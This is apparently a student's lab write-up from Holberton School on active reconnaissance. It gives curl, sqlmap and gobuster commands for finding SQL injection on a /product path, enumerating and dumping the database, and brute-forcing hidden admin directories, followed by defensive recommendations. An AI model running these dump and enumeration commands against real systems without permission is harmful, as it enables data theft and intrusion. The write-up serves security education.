Description

This project covers active reconnaissance techniques used in cybersecurity and penetration testing. All tasks were performed on an authorized Holberton School lab environment Active reconnaissance involves directly interacting with a target system to gather information, unlike passive reconnaissance which relies on publicly available data.

Tasks

Task 0 — Flag 1: Check the Source Code

File: 100-flag.txt

Concept: Developers sometimes leave sensitive information in HTML comments in production environments.
curl -L http://domainName

Finding: A hidden comment was found at the bottom of the HTML source:
Lesson: Always remove comments and sensitive information before deploying code to production.

Lesson: Always remove comments and sensitive information before deploying code to production.

Task 1 — Find the Injectable Page

File: 2-injectable.txt

Concept: SQL injection vulnerabilities exist in pages that pass user input directly to a database query without proper sanitization.

Method: Browsed the website to identify pages with dynamic parameters. Found product pages with numeric IDs in the URL path.

curl -L http://Domain

Finding: The /product path was injectable — the numeric ID in the URL was passed directly to the database.

Lesson: URL path parameters are just as dangerous as GET/POST parameters and must be sanitized.

Task 2 — Find the Database Name

File: 3-database.txt

Concept: SQL injection can be used to extract database metadata including database names, table names, and column names.

Method: Used SQLMap to enumerate databases on the injectable endpoint.

sqlmap -u "http://Domain/product/1" \
--current-db \
--batch \
--random-agent \
--timeout=30

Task 3 — Count the Tables

File: 4-tables.txt

Concept: After identifying the database, enumerate its tables to understand the data structure.

sqlmap -u "http://Domain/product/1" \
-D active.hbtn \
--tables \
--batch \
--random-agent \
--timeout=30

Finding:

Database: active.hbtn
[4 tables]
+----------+
| Admins   |
| Orders   |
| Products |
| Users    |
+----------+

Task 4 — Flag 2: Dump the Database

File: 101-flag.txt

Concept: Once tables are identified, their contents can be extracted to find sensitive data.

Method: Used SQLMap to dump all tables in the database.

sqlmap -u "http://Domain/product/1" \
-D active.hbtn \
--dump \
--batch \
--random-agent \
--timeout=30

Task 5 — Find the Hidden Admin Panel

File: 5-hidden_dir.txt

Concept: Web applications often have hidden admin panels not linked publicly. Directory brute forcing can discover them.

Method: Used Gobuster with a wordlist to enumerate hidden directories.

gobuster dir \
-u http://active.hbtn \
-w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
-b 302 \
--timeout 30s \
-t 5

Options explained:


-b 302 — ignore redirect responses to reduce false positives
-t 5 — use 5 threads for stability on slow server
--timeout 30s — allow more time per request

Key Lessons Learned


Source code review — always check HTML comments for sensitive info
URL parameters — path-based parameters can be just as vulnerable as query strings
SQL injection — unsanitized inputs can expose entire databases
Directory enumeration — admin panels can be discovered through brute forcing
Weak passwords — simple passwords are easily cracked or found in database dumps
Defense in depth — multiple layers of security are needed

Defensive Recommendations


Remove all comments from production source code
Use prepared statements / parameterized queries to prevent SQL injection
Hash passwords using bcrypt or argon2 — never store plain text
Rename or restrict admin panel access by IP whitelist
Implement WAF (Web Application Firewall)
Regular security audits using the same tools attackers use
Keep software updated — Nginx, MySQL, PHP etc.

Legal Disclaimer

All tasks in this project were performed on an authorized Holberton School lab environment. Performing these techniques on systems without explicit written permission is illegal and unethical.

